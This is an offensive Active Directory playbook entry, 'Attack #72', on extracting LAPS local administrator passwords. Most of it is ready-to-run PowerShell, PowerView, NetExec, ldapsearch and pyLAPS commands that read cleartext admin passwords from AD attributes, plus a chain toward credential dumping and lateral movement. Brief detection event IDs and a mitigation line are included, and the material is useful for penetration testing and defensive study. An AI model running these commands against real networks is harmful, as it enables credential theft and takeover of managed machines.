---
title: "Attack #72 — LAPS Password Extraction"
description: "LAPS (Local Administrator Password Solution) stores unique, randomized local admin passwords in Active Directory attributes (ms-Mcs-AdmPwd for LAPS v1…"
category: active-directory
subcategory: "Advanced & Post-Exploitation"
tags: ["active-directory"]
tools: ["NetExec", "ldapsearch", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Ten/🔷 Attack #72 — LAPS Password Extraction.md"
---
# 🔷 Attack #72 — LAPS Password Extraction

***

## 📖 How It Works

LAPS (Local Administrator Password Solution) stores unique, randomized local admin passwords in Active Directory attributes (`ms-Mcs-AdmPwd` for LAPS v1, `msLAPS-Password` / `msLAPS-EncryptedPassword` for LAPS v2) on computer objects. If a user can read these attributes (via ACL misconfiguration or group membership), they can extract the cleartext local admin password for any managed computer.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Read access to LAPS attributes** | Must have `Read ms-Mcs-AdmPwd` or `Read msLAPS-Password` |
| **Domain user with delegated LAPS read rights** | Often helpdesk, server admins |

***

## 💻 Full Commands

```powershell
# ── Check who can read LAPS passwords ─────────────────────────────────────────
Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=corp,DC=local"

# ── Read LAPS password (LAPS v1) ──────────────────────────────────────────────
Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd | Select Name,ms-Mcs-AdmPwd

# ── LAPS v2 ───────────────────────────────────────────────────────────────────
Get-LapsADPassword -Identity TARGET -AsPlainText

# ── PowerView ─────────────────────────────────────────────────────────────────
Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
```

```bash
# ── NetExec ───────────────────────────────────────────────────────────────────
nxc ldap DC01.corp.local -u low_user -p 'Password1' --module laps

# Or smb:
nxc smb DC01.corp.local -u low_user -p 'Password1' --laps

# ── ldapsearch ────────────────────────────────────────────────────────────────
ldapsearch -x -H ldap://DC01.corp.local -D "low_user@corp.local" -w 'Password1' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd

# ── pyLAPS ────────────────────────────────────────────────────────────────────
python3 pyLAPS.py --action get -d corp.local -u low_user -p 'Password1' --dc-ip 10.10.10.10
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | Read access to ms-Mcs-AdmPwd attribute |
| **Audit** | AD DS | Track who queries LAPS password attributes |

***

## 🔗 Attack Chain Context

```
[LAPS] ──→ Read local admin passwords from AD attributes
         │
         ├──→ 🔑 Each computer has unique local admin password
         ├──→ 🔗 Password → local admin → credential dumping → lateral movement
         └──→ 💀 Defeated by: restrict LAPS read delegation, audit access
```

***

> ✅ **Attack #72 — LAPS Password Extraction complete.**
